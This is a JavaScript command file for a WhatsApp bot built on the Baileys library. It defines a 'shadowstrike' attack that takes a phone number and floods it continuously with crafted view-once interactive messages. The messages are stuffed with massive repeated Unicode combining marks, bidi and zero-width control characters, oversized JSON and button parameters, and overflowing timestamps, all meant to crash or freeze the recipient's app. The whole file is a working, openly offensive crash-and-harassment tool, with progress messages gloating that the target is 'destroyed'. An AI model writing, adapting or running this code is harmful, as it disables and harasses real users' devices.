 const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const attackManager = require('../lib/attackManager');
const helpers = require('../lib/helpers');

module.exports = {
  name: 'shadowstrike',
  aliases: ['ss', 'shadow', 'callforce', 'rinnegan', 'silent', 'phantom', 'ghost', 'specter', 'wraith'],
  description: '🌑 ᴄᴀʟʟ ғᴏʀᴄᴇ ᴅᴇᴍᴏɴ - sɪʟᴇɴᴛ ᴅᴇsᴛʀᴏʏᴇʀ',
  ownerOnly: true,
  groupOnly: false,

  async execute(sock, msg, args, { sender, chatId }) {
    const target = args[0];
    const ownerNumbers = helpers.getOwnerNumbers();
    const ownerJid = ownerNumbers[0] ? `${ownerNumbers[0]}@s.whatsapp.net` : sender;
    
    if (!target) {
      return await sock.sendMessage(chatId, { 
        text: `╔═══════════════════════════════════════════╗
║ 🌑 sʜᴀᴅᴏᴡsᴛʀɪᴋᴇ - ᴄᴀʟʟ ғᴏʀᴄᴇ 🌑
╚═══════════════════════════════════════════╝

⛔ ᴍɪssɪɴɢ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ

📱 ᴜsᴀɢᴇ: .sʜᴀᴅᴏᴡsᴛʀɪᴋᴇ <ɴᴜᴍʙᴇʀ>
🛑 sᴛᴏᴘ: .sʜᴀᴅᴏᴡsᴛʀɪᴋᴇ sᴛᴏᴘ

☠️ ᴛʜɪs ᴅᴇᴍᴏɴ ғᴏʀᴄᴇs ᴄᴀʟʟs ғʀᴏᴍ 
ᴛʜᴇ ᴅᴇᴘᴛʜs ᴏғ ᴅᴀʀᴋɴᴇss.

👿 "sᴛʀɪᴋᴇ ғʀᴏᴍ ᴛʜᴇ sʜᴀᴅᴏᴡs" ☠️
╰────────────────────────────────────────╯` 
      });
    }

    if (target.toLowerCase() === 'stop') {
      const stopped = attackManager.stopAllAttacksForSender(sender);
      return await sock.sendMessage(chatId, { 
        text: `╔═══════════════════════════════════════════╗
║ 🛑 ᴀᴛᴛᴀᴄᴋ ʜᴀʟᴛᴇᴅ 🛑
╚═══════════════════════════════════════════╝

${stopped > 0 ? `✅ sᴛᴏᴘᴘᴇᴅ ${stopped} ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ(s)` : '⚠️ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋs ғᴏᴜɴᴅ'}

👿 "ᴛʜᴇ sʜᴀᴅᴏᴡs ғᴀᴅᴇ" ☠️
╰────────────────────────────────────────╯` 
      });
    }

    const targetJid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
    const attackId = attackManager.generateAttackId(sender, targetJid, 'shadowstrike');

    if (attackManager.isAttackActive(attackId)) {
      return await sock.sendMessage(chatId, { 
        text: `⚠️ ᴀᴛᴛᴀᴄᴋ ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ!\n\n🛑 ᴜsᴇ .sʜᴀᴅᴏᴡsᴛʀɪᴋᴇ sᴛᴏᴘ ᴛᴏ ʜᴀʟᴛ` 
      });
    }

    attackManager.startAttack(attackId, {
      sender,
      target: targetJid,
      commandName: 'shadowstrike',
      chatId
    });

    await sock.sendMessage(chatId, { 
      text: `╔═══════════════════════════════════════════╗
║ 🌑 sʜᴀᴅᴏᴡsᴛʀɪᴋᴇ ᴅᴇᴍᴏɴ ᴜɴʟᴇᴀsʜᴇᴅ 🌑
╚═══════════════════════════════════════════╝

🎯 ᴛᴀʀɢᴇᴛ: ${target}
⚡ sᴛᴀᴛᴜs: ᴄᴏɴᴊᴜʀɪɴɢ ᴅᴀʀᴋɴᴇss...
🔄 ᴄʏᴄʟᴇs: 0/100

👿 "sᴛʀɪᴋᴇ sᴡɪғᴛ, sᴛʀɪᴋᴇ ʜᴀʀᴅ" ☠️
╰────────────────────────────────────────╯` 
    });

    const texts = [
      "ᬼ".repeat(100000),
      "ោ៝".repeat(100000),
      ".ؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕ".repeat(50000),
      "𑜦𑜠".repeat(100000),
      "ًٌٍٍَُِِّّّْ".repeat(50000),
      "ꦾ".repeat(100000),
      "ۢ۬ۤۢ".repeat(50000),
      "᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳".repeat(50000),
      "\u200E\u200F\u202A\u202B\u202C\u202D\u202E".repeat(20000),
      "\uFEFF\u2060\u2061\u2062\u2063".repeat(20000)
    ];

    const attackFunction = async () => {
      for (const text of texts) {
        try {
          const msgContent = await generateWAMessageFromContent(
            targetJid,
            {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    header: {
                      title: "👿 ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs 👿",
                      hasMediaAttachment: false
                    },
                    body: {
                      text: "\n" + text
                    },
                    nativeFlowMessage: {
                      messageParamsJson: "{".repeat(20000),
                      buttons: [
                        {
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({ status: true, error: "overflow".repeat(5000) })
                        },
                        {
                          name: "call_permission_request",
                          buttonParamsJson: JSON.stringify({ status: true, error: "crash".repeat(5000) })
                        }
                      ]
                    },
                    contextInfo: {
                      isForwarded: true,
                      forwardingScore: 9999,
                      businessMessageForwardInfo: {
                        businessOwnerJid: "0@s.whatsapp.net"
                      },
                      disappearingMode: {
                        initiator: "INITIATED_BY_OTHER",
                        trigger: "ACCOUNT_SETTING"
                      },
                      externalAdReply: {
                        title: "👿 sʜᴀᴅᴏᴡsᴛʀɪᴋᴇ 👿",
                        body: "ោ៝".repeat(20000),
                        mediaType: 1,
                        thumbnailUrl: "https://files.catbox.moe/ykvioj.jpg",
                        mediaUrl: "about:blank".repeat(100),
                        sourceUrl: "about:blank".repeat(100)
                      },
                      quotedMessage: {
                        paymentInviteMessage: {
                          serviceType: 1,
                          expiryTimestamp: 99999999999 * 9999999e+21
                        }
                      },
                      groupInviteMessage: {
                        inviteCode: "X".repeat(19999),
                        groupJid: "13135550002@g.us",
                        groupName: "ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs【☠︎】".repeat(50),
                        inviteExpiration: 99999999999e+21,
                        caption: "sᴛʀɪᴋᴇ ғʀᴏᴍ ᴅᴀʀᴋɴᴇss".repeat(100)
                      }
                    }
                  }
                }
              }
            },
            {}
          );

          await sock.relayMessage(targetJid, msgContent.message, {
            messageId: msgContent.key.id
          });
        } catch (err) {
          console.error('Shadowstrike attack error:', err.message);
        }
      }
    };

    const rapidFireAttack = async () => {
      for (let i = 0; i < 5; i++) {
        await attackFunction();
      }
    };

    const onProgress = async (cycle, max) => {
      try {
        await sock.sendMessage(ownerJid, { 
          text: `🌑 sʜᴀᴅᴏᴡsᴛʀɪᴋᴇ ᴘʀᴏɢʀᴇss\n🎯 ${target}\n📊 ${cycle}/${max} sᴇɴᴛ - ᴛᴀʀɢᴇᴛ ᴅᴇsᴛʀᴏʏᴇᴅ!`
        });
      } catch (e) {}
    };

    const onComplete = async (cycle, status) => {
      const statusText = status === 'stopped' ? '🛑 sᴛᴏᴘᴘᴇᴅ' : '✅ ᴄᴏᴍᴘʟᴇᴛᴇᴅ';
      await sock.sendMessage(chatId, { 
        text: `╔═══════════════════════════════════════════╗
║ 🌑 sʜᴀᴅᴏᴡsᴛʀɪᴋᴇ ${statusText} 🌑
╚═══════════════════════════════════════════╝

🎯 ᴛᴀʀɢᴇᴛ: ${target}
📊 ᴄʏᴄʟᴇs ᴄᴏᴍᴘʟᴇᴛᴇᴅ: ${cycle}/100

👿 "ʏᴏᴜʀ ᴅᴇᴠɪᴄᴇ ɪs ᴍɪɴᴇ" ☠️
╰────────────────────────────────────────╯` 
      });
    };

    attackManager.runContinuousAttack(sock, attackId, rapidFireAttack, onProgress, onComplete);
  }
}; 
